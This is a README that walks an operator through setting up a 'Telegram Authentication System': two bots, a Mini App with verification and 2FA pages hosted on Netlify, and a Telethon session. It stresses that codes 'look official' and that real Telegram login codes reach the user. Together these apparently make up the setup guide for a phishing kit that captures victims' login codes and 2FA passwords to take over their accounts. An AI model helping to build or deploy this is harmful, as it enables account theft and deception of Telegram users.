# Telegram Authentication System

## Two Options Available:

### 1. **Bot API Only (`bot.py`)** ✅ EASY & RECOMMENDED
- Sends OTP via bot chat (looks official)
- Perfect for most use cases
- Simple setup

### 2. **Real Telegram OTP (`combined_bot.py`) ⚠️ ADVANCED
- Uses real Telegram MTProto API
- OTP comes directly from Telegram servers
- Requires API credentials from https://my.telegram.org

---

## Setup for Option 1 (Bot API Only - EASY!)

1. **Create a Telegram Bot**
   - Go to @BotFather on Telegram
   - Create a new bot and get your bot token
   - Set `BOT_TOKEN` in `.env`

2. **Install Dependencies**
   ```
   .\venv\Scripts\activate
   pip install -r requirements.txt
   ```

3. **Host the Mini App**
   - Host the `static` folder on Netlify/Vercel/ngrok
   - Update `MINI_APP_URL` in `.env`

4. **Run the Bot**
   ```
   .\venv\Scripts\python.exe bot.py
   ```

---

## Setup for Option 2 (Real Telegram OTP - ADVANCED!)

1. **Get API Credentials**
   - Go to https://my.telegram.org
   - Create an app to get API_ID and API_HASH
   - Update `.env` with these values

2. **Install Dependencies**
   ```
   .\venv\Scripts\activate
   pip install -r requirements.txt
   ```

3. **First Time Setup (Telethon Session)**
   - Run `telegram_auth_bot.py` ONCE first
   - It will ask for your phone number
   - Enter the OTP from Telegram
   - This creates `main_session.session` file

4. **Host the Mini App**
   - Same as Option 1

5. **Run the Combined Bot**
   ```
   .\venv\Scripts\python.exe combined_bot.py
   ```

---

## Project Structure

```
telgram/
├── static/                # Mini App files
│   ├── index.html        # Main verification page
│   ├── twofa.html        # 2FA page
│   ├── styles.css        # Styles
│   ├── app.js            # Mini App logic
│   └── video/            # Put your videos here
│       ├── video1.mp4
│       └── video2.mp4
├── .env                  # Environment variables
├── .gitignore            # Ignore list
├── bot.py                # Option 1: Bot API only
├── combined_bot.py       # Option 2: Real Telegram OTP
├── telegram_auth_bot.py  # Telethon setup script
├── requirements.txt      # Dependencies
└── README.md            # This file!
```

---

## Netlify Setup

1. Drag and drop the `static/` folder to Netlify
2. Copy your site URL
3. Update `MINI_APP_URL` in `.env`
